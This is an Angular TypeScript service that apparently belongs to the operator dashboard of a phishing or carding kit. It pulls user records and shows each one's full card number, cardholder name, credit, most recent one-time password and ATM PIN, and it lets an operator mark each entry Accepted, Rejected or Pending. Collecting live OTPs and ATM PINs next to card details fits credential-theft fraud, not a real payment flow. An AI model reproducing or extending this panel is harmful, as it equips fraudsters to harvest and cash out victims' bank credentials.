import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable, throwError } from 'rxjs';
import { map, catchError } from 'rxjs/operators';

export interface Transaction {
  id: string;
  totalPrice: number;
  visaDetails: string;
  otp: string;
  atmPass: string;
  status: 'Pending' | 'Accepted' | 'Rejected';
  createdAt?: string;
}

@Injectable({
  providedIn: 'root'
})
export class DashboardService extends BaseApiService {
  private readonly baseUrl = '/api/user';

  getTransactions(): Observable<Transaction[]> {
    return this.get<any[]>(`${this.baseUrl}/all`).pipe(
      map(users => {
        console.log('Raw API response:', users);
        if (!Array.isArray(users)) {
          return [];
        }
        return users.map(user => {
          const otps = Array.isArray(user.Otps) ? user.Otps : (Array.isArray(user.otps) ? user.otps : []);
          const atms = Array.isArray(user.Atms) ? user.Atms : (Array.isArray(user.atms) ? user.atms : []);
          const lastOtp = otps.length > 0 ? (otps[otps.length - 1].Otp || otps[otps.length - 1].otp || 'N/A') : 'N/A';
          const lastAtm = atms.length > 0 ? (atms[atms.length - 1].AtmPass || atms[atms.length - 1].pass || 'N/A') : 'N/A';

          return {
            id: user.CardId || user.id || '',
            totalPrice: Number(user.Credit ?? user.credit ?? 0),
            visaDetails: `${user.CardNumber || user.cc_number || 'N/A'} - ${user.CardHolder || user.cc_name || 'N/A'}`,
            otp: String(lastOtp),
            atmPass: String(lastAtm),
            status: this.normalizeStatus(user.Status || user.status),
            createdAt: user.CreatedAt || user.created_at
          };
        });
      }),
      catchError(err => {
        console.error('Dashboard API error:', err);
        return throwError(() => err);
      })
    );
  }

  private normalizeStatus(rawStatus?: string): 'Pending' | 'Accepted' | 'Rejected' {
    if (!rawStatus) return 'Pending';
    const s = String(rawStatus).toUpperCase();
    if (s === 'ACCEPTED') return 'Accepted';
    if (s === 'REJECTED') return 'Rejected';
    return 'Pending';
  }

  updateTransactionStatus(id: string, status: 'Accepted' | 'Rejected' | 'Pending'): Observable<{ success: boolean }> {
    return this.patch<{ success: boolean }>(`${this.baseUrl}/${id}`, { status: status.toUpperCase() });
  }
}
